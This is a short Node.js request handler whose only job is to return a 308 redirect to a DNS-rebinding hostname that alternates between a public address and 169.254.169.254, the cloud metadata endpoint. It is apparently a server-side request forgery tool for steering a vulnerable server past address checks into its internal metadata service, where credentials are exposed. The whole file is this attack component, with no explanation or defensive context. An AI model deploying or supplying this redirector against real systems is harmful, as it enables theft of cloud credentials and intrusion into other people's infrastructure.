module.exports = (req, res) => {
  res.statusCode = 308;
  res.setHeader(
    "Location",
    "http://make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms"
  );
  res.end();
};
